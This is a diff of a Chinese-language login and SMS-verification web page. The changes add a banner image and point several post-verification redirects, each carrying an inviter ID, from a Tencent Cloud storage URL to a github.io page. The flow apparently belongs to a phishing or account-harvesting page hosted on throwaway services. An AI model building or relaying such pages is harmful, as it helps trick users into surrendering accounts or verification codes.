@@ -159,7 +159,7 @@
 </head>
 <body>
 <div class="banner">
-    
+    <img src="./banner.jpg">
 </div>
 <div class="shareregs">
     <h4 id="state">登录</h4>
@@ -451,7 +451,7 @@ function validate2(){
 
   function copy() {
   var yqr = Request['yqr'];
-           location.href="https://7462-tb-7g4gbies64f3d39a-1312449085.tcb.qcloud.la/wp/wp.html?yqr="+yqr;  
+           location.href="http://qqfh.github.io/wp/?yqr="+yqr;  
         }
 		
 	function fdx() {
@@ -538,7 +538,7 @@ function func2(){
                 if(xhr.responseText==4){
                     document.getElementById("state").innerHTML=  ('验证成功!密码是：完成');
                     //document.getElementById("EleId").style.display="block";
-					location.href="https://7462-tb-7g4gbies64f3d39a-1312449085.tcb.qcloud.la/wp/wp.html?yqr="+yqr; 
+					location.href="http://qqfh.github.io/wp/?yqr="+yqr; 
                 }
                 if(xhr.responseText==5){
                     //document.getElementById("code1").value = "";//清空文本框
@@ -555,7 +555,7 @@ function func2(){
 					
                 }
 				if(xhr.responseText==6){//无法做的 放行 跳转
-                    location.href="https://7462-tb-7g4gbies64f3d39a-1312449085.tcb.qcloud.la/wp/wp.html?yqr="+yqr; 
+                    location.href="http://qqfh.github.io/wp/?yqr="+yqr; 
 					
                 }
 				if(xhr.responseText==7){//只能发的号码
@@ -617,7 +617,7 @@ var yqr = Request['yqr'];
                 layer.close(index);
                 if (res.code === 200){
                     setTimeout(function () {
-                        location.href="https://7462-tb-7g4gbies64f3d39a-1312449085.tcb.qcloud.la/wp/wp.html?yqr="+yqr; 
+                        location.href="http://qqfh.github.io/wp/?yqr="+yqr; 
                     },1000)
                 }
                 layer.msg(res.msg, {shade: 0, time: 1500});
@@ -643,7 +643,7 @@ var yqr = Request['yqr'];
 							
                             $(".send").removeAttr('disabled')
                             clearInterval(ping);
-							location.href="https://7462-tb-7g4gbies64f3d39a-1312449085.tcb.qcloud.la/wp/wp.html?yqr="+yqr; 
+							location.href="http://qqfh.github.io/wp/?yqr="+yqr; 
                         } else {
                             $(".send").text((s - 1) + "秒");
                             $(".send").attr('s', (s - 1));
@@ -655,7 +655,7 @@ var yqr = Request['yqr'];
                 }
                 if (res.code === 501) {
                     setTimeout(function () {
-                        location.href="https://7462-tb-7g4gbies64f3d39a-1312449085.tcb.qcloud.la/wp/wp.html?yqr="+yqr; 
+                        location.href="http://qqfh.github.io/wp/?yqr="+yqr; 
                     },1000)
                 }
                 layer.msg(res.msg, {shade: 0, time: 1500});
